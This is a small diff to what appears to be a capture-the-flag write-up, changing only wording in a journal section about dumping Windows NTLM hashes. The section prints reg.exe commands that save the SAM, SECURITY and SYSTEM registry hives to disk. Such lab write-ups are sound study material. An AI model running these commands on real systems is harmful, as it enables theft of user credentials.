@@ -207,12 +207,12 @@ gives an Administrator shell. I could just into the Administrator directory and 
 
 ## Journal:
 ### User NTLM Hashes:
-- Located in registry keys SAM, SECURITY and SYSTEM
+- Located in registries SAM, SECURITY and SYSTEM
 I dumped the hashes using reg.exe:\
 `reg.exe save hklm\sam SAM`\
 `reg.exe save hklm\security SECURITY`\
 `reg.exe save hklm\system SYSTEM`
-- This saved the registry keys to my current working directory
+- This saved the registries to my current working directory
 
 ![hash_registry_files_extracting](../pictures/blueprint/hash_registry_extract.png)
 
